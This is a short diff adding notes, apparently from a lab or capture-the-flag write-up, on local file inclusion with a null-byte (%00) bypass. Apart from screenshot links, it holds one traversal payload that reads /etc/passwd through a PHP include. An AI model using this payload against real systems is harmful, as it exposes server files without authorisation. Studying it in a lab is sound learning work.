@@ -80,3 +80,18 @@ MAPI=1
 ![image](https://user-images.githubusercontent.com/58542375/173571368-0162dbef-2b3f-41af-918d-c39c119c0773.png)
 
 ## Task 5 Local File Inclusion - LFI #2
+*NullByte* `%00`
+
+![image](https://user-images.githubusercontent.com/58542375/174087161-2dee0f9f-8598-41fd-a854-6ed4d85f0756.png)
+
+![image](https://user-images.githubusercontent.com/58542375/174087424-cea7c291-3b65-42d1-b17c-289866414575.png)
+
+`include("languages/../../../../../etc/passwd%00").".php");`
+
+![image](https://user-images.githubusercontent.com/58542375/174106633-be705e4f-8bcd-422c-b4c9-973577bce1d9.png)
+
+![image](https://user-images.githubusercontent.com/58542375/174107025-413f758e-caa8-4734-afb7-e5255d881fa5.png)
+
+![image](https://user-images.githubusercontent.com/58542375/174107409-e3e199de-be90-45ed-8247-49329ab31746.png)
+
+![image](https://user-images.githubusercontent.com/58542375/174108235-f3dd51f4-39c1-42f3-95ee-02d8c618389e.png)
